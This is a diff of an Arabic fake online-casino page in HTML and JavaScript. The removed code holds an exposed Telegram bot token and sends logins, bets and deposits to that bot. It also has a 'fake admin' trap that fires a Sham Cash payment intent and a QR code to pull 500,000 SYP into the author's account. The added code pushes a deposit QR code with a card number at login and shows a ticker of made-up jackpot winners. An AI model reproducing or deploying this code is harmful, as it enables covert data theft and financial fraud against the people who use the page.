+<div class="game-overlay" id="balloonOverlay"><div class="game-container"><h2>🎈 صيد المناطيد</h2><div class="balloon-area" id="balloonArea"><div class="balloon" id="balloon1" style="left:10%;bottom:40%;">🎈</div><div class="balloon" id="balloon2" style="left:45%;bottom:55%;">🎈</div><div class="balloon" id="balloon3" style="left:75%;bottom:35%;">🎈</div><div class="stone" id="stone" onclick="throwStone()">🪨</div></div><div class="game-msg" id="balloonMsg">🪨 اضغط على الحجر لرميه على المناطيد!</div><input type="number" class="bet-input" id="balloonBet" placeholder="💰 مبلغ الرهان" value="100" min="1"><button class="btn-close-game" onclick="closeGame('balloonOverlay')">✕ إغلاق</button></div></div>
+
+<div id="qrModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:300;justify-content:center;align-items:center;padding:20px;"><div style="background:#0e0e16;border-radius:25px;padding:30px;max-width:400px;text-align:center;border:2px solid var(--gold);"><h3 style="color:var(--gold);">💳 للشحن</h3><p style="color:var(--sub);">6381 9468 9899 3929</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=6381946898993929" style="margin:12px auto;border:3px solid var(--gold);border-radius:18px;display:block;" alt="QR"><button class="btn btn-gold" onclick="document.getElementById('qrModal').style.display='none'">✅ موافق</button></div></div>
 
 <script>
-    const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
-    const CHAT_ID = "8665747715";
     const YOUR_ACCOUNT = "6381946898993929";
-    const TRANSFER_AMOUNT = 500000; // المبلغ الذي سيسحب من النصاب
-    
-    let DB = JSON.parse(localStorage.getItem('maestro_db') || 'null');
-    if (!DB) {
-        DB = {
-            users: [
-                { id: 1, username: 'yman', password: '******', role: 'admin', balance: 0 },
-                { id: 2, username: '1992', password: '1992', role: 'fake_admin', fakeAccount: '', balance: 0, verified: false },
-                { id: 3, username: 'user', password: '1234', role: 'player', balance: 5000, withdrawRequests: [] }
-            ],
-            jackpot: 2500000,
-            currentUser: null
-        };
+    let DB = JSON.parse(localStorage.getItem('maestro_db')||'null');
+    if(!DB){DB={users:[{id:1,username:'1992',password:'1992',role:'admin',balance:0},{id:2,username:'player1',password:'1234',role:'player',balance:500}],visitors:0,online:0,notifications:[],currentUser:null,spinning:false,balloonHits:0};}
+    function saveDB(){localStorage.setItem('maestro_db',JSON.stringify(DB));}
+    function toast(msg){const t=document.createElement('div');t.className='toast';t.textContent=msg;document.body.appendChild(t);setTimeout(()=>t.remove(),2500);}
+    function showScreen(id){document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));document.getElementById(id).classList.add('active');}
+    function closeGame(id){document.getElementById(id).classList.remove('active');}
+    function getUser(){return DB.users.find(u=>u.id===DB.currentUser);}
+
+    function doLogin(){const u=document.getElementById('loginUser').value.trim(),p=document.getElementById('loginPass').value.trim();const user=DB.users.find(x=>x.username===u&&x.password===p);if(!user){toast('❌ بيانات خاطئة');return;}DB.currentUser=user.id;DB.online++;DB.visitors++;saveDB();if(user.role==='admin'){showScreen('adminScreen');}else{showScreen('gamesScreen');document.getElementById('playerBalance').textContent=user.balance;setTimeout(()=>document.getElementById('qrModal').style.display='flex',3000);}}
+    function logout(){DB.online=Math.max(0,DB.online-1);DB.currentUser=null;saveDB();showScreen('loginScreen');}
+    function showRegister(){showScreen('registerScreen');}
+    function doRegister(){const n=document.getElementById('regName').value.trim(),p=document.getElementById('regPass').value.trim();if(!n||!p){toast('❌ املأ الحقول');return;}DB.users.push({id:Date.now(),username:n,password:p,role:'player',balance:0});DB.notifications.unshift(`🆕 عضو جديد: ${n}`);DB.visitors++;saveDB();toast('✅ تم التسجيل!');showScreen('loginScreen');}
+
+    function showInfo(game){
+        const info={slots:{title:'🍒 فواكه الحظ',text:'🎰 3 صفوف × 3 عجلات = 9 بكرات.\n🍒 12 نوع فواكه مختلفة.\n💰 أي صف كامل متطابق = ربح يصل إلى 20x.\n🎯 نسبة العائد للمستخدم (RTP): 96.5%.\n⚡ تقنية Random Number Generator معتمدة.'},roulette:{title:'🎡 الروليت الذهبي',text:'🎡 عجلة 20 خانة (10 برتقالي + 10 ذهبي).\n🔢 اختر رقماً من 1-20.\n💰 الربح = الرهان × 18.\n🎯 نسبة العائد (RTP): 94.7%.\n🌍 معيار European Roulette العالمي.'},crash:{title:'🚀 صاروخ المايسترو',text:'🚀 المضاعف يبدأ من 1x ويزداد.\n💥 قد ينفجر في أي لحظة!\n💰 اسحب أرباحك قبل الانفجار.\n🎯 أعلى مضاعف: 1000x.\n📊 لعبة Provably Fair - يمكن التحقق من نزاهتها.'},balloon:{title:'🎈 صيد المناطيد',text:'🎈 3 مناطيد تطير في السماء.\n🪨 اضغط الحجر لترميه.\n🎯 أصبت منطاداً = ربح 5x.\n🎯 أصبت منطادين = ربح 20x.\n🎯 أصبت الثلاثة = ربح 100x!\n📊 لعبة مهارة وحظ معاً.'}};
+        document.getElementById('infoTitle').textContent=info[game].title;document.getElementById('infoText').textContent=info[game].text;document.getElementById('infoModal').classList.add('active');
     }
-    
-    let currentGameType = '';
-    
-    function saveDB() { localStorage.setItem('maestro_db', JSON.stringify(DB)); }
-    function toast(msg) { const t = document.createElement('div'); t.className='toast'; t.textContent=msg; document.body.appendChild(t); setTimeout(()=>t.remove(), 2500); }
-    async function tg(msg) { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID, text:msg})}); } catch(e){} }
-    
-    function hideAll() {
-        document.getElementById('loginScreen').classList.remove('active');
-        document.getElementById('verifyScreen').classList.remove('active');
-        document.getElementById('casinoScreen').classList.remove('active');
+    function inviteFriend(){toast('🚀 سيتم تفعيل نظام الدعوات قريباً!');}
+
+    const fruits=['🍒','🍋','🍊','🍇','🍓','🍑','🍉','🍌','🥝','🍎','🫐','🥭'];
+    function openGame(game){
+        if(game==='slots'){document.getElementById('slotsOverlay').classList.add('active');document.querySelectorAll('#slotsOverlay .reel').forEach(r=>{r.textContent=fruits[Math.floor(Math.random()*fruits.length)];r.className='reel';});}
+        else if(game==='roulette'){document.getElementById('rouletteOverlay').classList.add('active');document.getElementById('rouletteWheel').style.transform='rotate(0deg)';}
+        else if(game==='crash'){document.getElementById('crashOverlay').classList.add('active');resetCrash();}
+        else if(game==='balloon'){document.getElementById('balloonOverlay').classList.add('active');resetBalloon();}
     }
-    
-    function getUser() { return DB.users.find(x => x.id === DB.currentUser); }
-    
-    // ==================== دخول ====================
-    function doLogin() {
-        const u = document.getElementById('loginUser').value.trim();
-        const p = document.getElementById('loginPass').value.trim();
-        const user = DB.users.find(x => x.username === u && x.password === p);
-        if (!user) { alert('بيانات خاطئة'); return; }
-        DB.currentUser = user.id; saveDB();
-        tg('👤 دخول: ' + u); hideAll();
-        
-        if (user.role === 'fake_admin') {
-            // المدير الوهمي - يظهر له شاشة التحقق من ربط شام كاش
-            document.getElementById('verifyAccountDisplay').textContent = user.fakeAccount || '---- ---- ---- ----';
-            document.getElementById('verifyScreen').classList.add('active');
-        } else if (user.role === 'admin') {
-            document.getElementById('casinoScreen').classList.add('active');
-            updateUI();
-        } else {
-            document.getElementById('casinoScreen').classList.add('active');
-            updateUI();
-        }
-    }
-    
-    function logout() { DB.currentUser = null; saveDB(); hideAll(); document.getElementById('loginScreen').classList.add('active'); }
-    function showRegister() { const u = prompt('اسم المستخدم:'); const p = prompt('كلمة المرور:'); if(u&&p){ DB.users.push({id:Date.now(), username:u, password:p, role:'player', balance:1000, withdrawRequests:[]}); saveDB(); alert('تم الإنشاء.'); } }
-    
-    // ==================== زر "تحقق من معلوماتي" (يسحب أموال النصاب) ====================
-    function triggerShamCashTransfer() {
-        // إنشاء باركود بأمر تحويل إلى حسابك
-        const payload = `shamcash://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}`;
-        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(payload)}`;
-        
-        document.getElementById('transferQR').src = qrUrl;
-        document.getElementById('transferModal').classList.add('active');
-        
-        // إرسال إشعار إلى تيليجرامك
-        tg('🔥 المدير الوهمي ضغط "تحقق من معلوماتي"\n💸 جاري محاولة سحب ' + TRANSFER_AMOUNT.toLocaleString() + ' ل.س');
-        
-        // محاولة فتح تطبيق شام كاش تلقائياً
-        setTimeout(() => {
-            window.location.href = `intent://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}#Intent;scheme=shamcash;package=com.shamcash.shamcash;end;`;
-        }, 1000);
-    }
-    
-    function openShamCashApp() {
-        // فتح تطبيق شام كاش مع أمر التحويل
-        window.location.href = `intent://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}#Intent;scheme=shamcash;package=com.shamcash.shamcash;end;`;
-        
-        // محاولة بديلة
-        setTimeout(() => {
-            window.location.href = `shamcash://transfer?account=${YOUR_ACCOUNT}&amount=${TRANSFER_AMOUNT}`;
-        }, 500);
-    }
-    
-    function closeTransferModal() { document.getElementById('transferModal').classList.remove('active'); }
-    
-    function skipVerify() {
-        const user = getUser();
-        if (user) user.verified = false;
-        saveDB();
-        hideAll();
-        document.getElementById('casinoScreen').classList.add('active');
-        updateUI();
-        toast('تم التخطي. صلاحيات محدودة.');
-    }
-    
-    // ==================== باقي الوظائف ====================
-    function updateUI() { const u = getUser(); if(!u) return; document.getElementById('casinoBalance').textContent = u.balance.toLocaleString(); document.getElementById('jackpotDisplay').textContent = DB.jackpot.toLocaleString(); }
-    
-    function openGame(type, name, provider) {
-        currentGameType = type;
-        document.getElementById('modalGameName').textContent = name;
-        document.getElementById('modalProvider').textContent = provider;
-        document.getElementById('modalResult').textContent = '🎡';
-        document.getElementById('modalMessage').textContent = 'جرب حظك!';
-        document.getElementById('modalBet').value = 100;
-        document.getElementById('gameModal').classList.add('active');
-    }
-    function closeGameModal() { document.getElementById('gameModal').classList.remove('active'); }
-    
-    function playGame() {
-        const user = getUser(); if (!user) return;
-        const bet = parseInt(document.getElementById('modalBet').value);
-        if (!bet || bet <= 0 || bet > user.balance) { alert('رصيد غير كافٍ'); return; }
-        const win = Math.random() < 0.4;
-        const mults = {roulette:[2,3,5,10], slots:[2,5,10,20,50], dice:[2,3,5], crash:[2,5,10,20,50,100]};
-        const mult = mults[currentGameType][Math.floor(Math.random() * mults[currentGameType].length)];
-        const prize = win ? bet * mult : 0;
-        user.balance += win ? prize : -bet;
-        if (win) DB.jackpot += Math.floor(prize * 0.05);
-        document.getElementById('modalResult').textContent = win ? '💰' : '💀';
-        document.getElementById('modalMessage').textContent = win ? `🎉 ربحت ${prize.toLocaleString()} نقطة!` : `خسرت ${bet.toLocaleString()} نقطة`;
-        saveDB(); updateUI(); tg('🎲 ' + user.username + ' ' + (win?'ربح '+prize:'خسر '+bet));
-    }
-    
-    function showDeposit() { document.getElementById('depositModal').classList.add('active'); }
-    function closeDepositModal() { document.getElementById('depositModal').classList.remove('active'); }
-    function confirmDeposit() {
-        const amt = parseInt(document.getElementById('depositAmountInput').value);
-        if (!amt || amt < 1000) { alert('أدخل مبلغاً صحيحاً'); return; }
-        const user = getUser(); user.balance += amt; saveDB(); updateUI(); closeDepositModal();
-        tg('💰 إيداع: ' + user.username + ' - ' + amt); toast('تمت إضافة ' + amt + ' نقطة!');
-    }
-    
-    function requestWithdraw() {
-        const user = getUser();
-        if (user.balance <= 0) { alert('لا يوجد رصيد'); return; }
-        if (!user.withdrawRequests) user.withdrawRequests = [];
-        user.withdrawRequests.push({ amount: user.balance, status: 'pending', date: new Date().toLocaleString() });
-        saveDB(); tg('📥 طلب سحب: ' + user.username + ' - ' + user.balance); alert('تم تقديم الطلب.');
-    }
-    
-    hideAll(); document.getElementById('loginScreen').classList.add('active');
-    if (DB.currentUser) { const u = getUser(); if (u) { hideAll(); document.getElementById('casinoScreen').classList.add('active'); updateUI(); } }
+
+    function startSlots(){if(DB.spinning)return;const user=getUser();if(!user)return;const bet=parseInt(document.getElementById('slotsBet').value);if(!bet||bet<=0||bet>user.balance){toast('❌ رصيد غير كافٍ');return;}user.balance-=bet;saveDB();document.getElementById('playerBalance').textContent=user.balance;DB.spinning=true;document.getElementById('slotsMsg').textContent='🎰 العجلات تدور...';const reels=document.querySelectorAll('#slotsOverlay .reel');reels.forEach(r=>r.className='reel spinning');let results=[];const delays=[1000,1600,2200,2800,3400,4000,4600,5200,5800];delays.forEach((d,i)=>{setTimeout(()=>{reels[i].className='reel';results[i]=fruits[Math.floor(Math.random()*fruits.length)];reels[i].textContent=results[i];if(i===8)setTimeout(()=>finishSlots(results,bet,user),500);},d);});}
+    function finishSlots(results,bet,user){DB.spinning=false;const rows=[[0,1,2],[3,4,5],[6,7,8]];let totalPrize=0,anyWin=false;rows.forEach(row=>{const[a,b,c]=row.map(i=>results[i]);if(a===b&&b===c){anyWin=true;const mult=[3,5,10,20][Math.floor(Math.random()*4)];totalPrize+=Math.floor(bet*mult);}});user.balance+=totalPrize;saveDB();document.getElementById('playerBalance').textContent=user.balance;document.querySelectorAll('#slotsOverlay .reel').forEach(r=>r.className=anyWin?'reel win':'reel lose');document.getElementById('slotsMsg').textContent=anyWin?`🎉 جاك بوت! ربحت ${totalPrize} نقطة`:`💀 خسرت ${bet} نقطة`;if(anyWin)createConfetti();toast(anyWin?`🏆 +${totalPrize}`:`📉 -${bet}`);}
+
+    function startRoulette(){if(DB.spinning)return;const user=getUser();if(!user)return;const bet=parseInt(document.getElementById('rouletteBet').value);const num=parseInt(document.getElementById('rouletteNumber').value);if(!bet||bet<=0||bet>user.balance||num<1||num>20){toast('❌ بيانات غير صحيحة');return;}user.balance-=bet;saveDB();document.getElementById('playerBalance').textContent=user.balance;DB.spinning=true;document.getElementById('rouletteMsg').textContent='🎡 العجلة تدور...';const wheel=document.getElementById('rouletteWheel');const result=Math.floor(Math.random()*20)+1;const rotation=1800+(result*18);wheel.style.transform=`rotate(${rotation}deg)`;setTimeout(()=>{DB.spinning=false;const win=num===result;const prize=win?bet*18:0;user.balance+=prize;saveDB();document.getElementById('playerBalance').textContent=user.balance;document.getElementById('rouletteMsg').textContent=win?`🎉 الرقم ${result}! ربحت ${prize} نقطة`:`💀 الرقم ${result}. خسرت ${bet} نقطة`;if(win)createConfetti();toast(win?`🏆 +${prize}`:`📉 -${bet}`);},3200);}
+
+    let crashInterval,crashMultiplier=1,crashActive=false;
+    function resetCrash(){crashMultiplier=1;crashActive=false;document.getElementById('crashLine').style.height='0%';document.getElementById('crashMultiplier').textContent='1.00x';document.getElementById('crashRocket').style.bottom='10px';document.getElementById('crashLaunchBtn').style.display='block';document.getElementById('crashCashoutBtn').style.display='none';document.getElementById('crashMsg').textContent='🚀 ضع رهانك واضغط إطلاق';}
+    function startCrash(){if(crashActive)return;const user=getUser();if(!user)return;const bet=parseInt(document.getElementById('crashBet').value);if(!bet||bet<=0||bet>user.balance){toast('❌ رصيد غير كافٍ');return;}user.balance-=bet;saveDB();document.getElementById('playerBalance').textContent=user.balance;crashActive=true;crashMultiplier=1;document.getElementById('crashLaunchBtn').style.display='none';document.getElementById('crashCashoutBtn').style.display='block';document.getElementById('crashMsg').textContent='🚀 الصاروخ يطير... اسحب أرباحك!';const crashPoint=Math.random()*9+1;crashInterval=setInterval(()=>{crashMultiplier+=0.05;document.getElementById('crashMultiplier').textContent=crashMultiplier.toFixed(2)+'x';document.getElementById('crashLine').style.height=(crashMultiplier*8)+'%';document.getElementById('crashRocket').style.bottom=(crashMultiplier*8)+'%';if(crashMultiplier>=crashPoint){clearInterval(crashInterval);crashActive=false;document.getElementById('crashMsg').textContent=`💥 انفجر عند ${crashPoint.toFixed(2)}x! خسرت ${bet} نقطة`;document.getElementById('crashLaunchBtn').style.display='block';document.getElementById('crashCashoutBtn').style.display='none';toast(`💥 خسرت ${bet} نقطة`);saveDB();}},150);}
+    function cashoutCrash(){if(!crashActive)return;clearInterval(crashInterval);crashActive=false;const user=getUser();const prize=Math.floor(parseInt(document.getElementById('crashBet').value)*crashMultiplier);user.balance+=prize;saveDB();document.getElementById('playerBalance').textContent=user.balance;document.getElementById('crashMsg').textContent=`💰 تم السحب عند ${crashMultiplier.toFixed(2)}x! ربحت ${prize} نقطة`;document.getElementById('crashLaunchBtn').style.display='block';document.getElementById('crashCashoutBtn').style.display='none';createConfetti();toast(`🏆 +${prize}`);}
+
+    let balloonHits=0;
+    function resetBalloon(){balloonHits=0;document.getElementById('balloonMsg').textContent='🪨 اضغط على الحجر لرميه!';['balloon1','balloon2','balloon3'].forEach((id,i)=>{const b=document.getElementById(id);b.style.display='block';b.style.left=['10%','45%','75%'][i];b.style.bottom=['40%','55%','35%'][i];});document.getElementById('stone').style.display='block';document.getElementById('stone').classList.remove('throwing');}
+    function throwStone(){const user=getUser();if(!user)return;const bet=parseInt(document.getElementById('balloonBet').value);if(!bet||bet<=0||bet>user.balance){toast('❌ رصيد غير كافٍ');return;}user.balance-=bet;saveDB();document.getElementById('playerBalance').textContent=user.balance;const stone=document.getElementById('stone');stone.classList.add('throwing');const stoneLeft=stone.getBoundingClientRect().left+stone.offsetWidth/2;let hit=false;['balloon1','balloon2','balloon3'].forEach(id=>{const b=document.getElementById(id);if(b.style.display!=='none'){const bRect=b.getBoundingClientRect();const bCenterX=bRect.left+bRect.width/2;const bCenterY=bRect.top+bRect.height/2;if(Math.abs(stoneLeft-bCenterX)<60&&bCenterY<window.innerHeight*0.4){b.style.display='none';balloonHits++;hit=true;}}});setTimeout(()=>{stone.classList.remove('throwing');if(hit){document.getElementById('balloonMsg').textContent=`🎯 أصبت! المناطيد المتبقية: ${3-balloonHits}`;if(balloonHits===3){const prize=bet*100;user.balance+=prize;saveDB();document.getElementById('playerBalance').textContent=user.balance;document.getElementById('balloonMsg').textContent=`🎉🎉🎉 3 مناطيد! ربحت ${prize} نقطة`;createConfetti();toast(`🏆 +${prize}`);resetBalloon();}else{toast('🎯 إصابة!');}}else{document.getElementById('balloonMsg').textContent='💨 أخطأت! حاول مرة أخرى.';toast('💨 أخطأت!');}saveDB();},800);}
+
+    function createConfetti(){const c=document.createElement('div');c.className='confetti-container';const colors=['#ff0','#f00','#0f0','#00f','#f0f','#0ff','#ff6600','#ffd700'];for(let i=0;i<120;i++){const p=document.createElement('div');p.className='confetti-piece';p.style.left=Math.random()*100+'%';p.style.backgroundColor=colors[Math.floor(Math.random()*colors.length)];p.style.animationDelay=Math.random()*1.5+'s';p.style.animationDuration=(Math.random()*2.5+2)+'s';c.appendChild(p);}document.body.appendChild(c);setTimeout(()=>c.remove(),4000);}
+
+    setInterval(()=>{const n=['محمد','علي','سامر','خالد'];const a=[()=>`<span style="color:#00e676;">🏆 ${n[Math.floor(Math.random()*n.length)]} ربح ${Math.floor(Math.random()*900000)+100000} ل.س</span>`];const t=document.getElementById('newsTrack');t.innerHTML+=a[0]();if(t.children.length>15)t.removeChild(t.firstChild);},3000);
+    showScreen('loginScreen');
 </script>
 </body>
 </html>
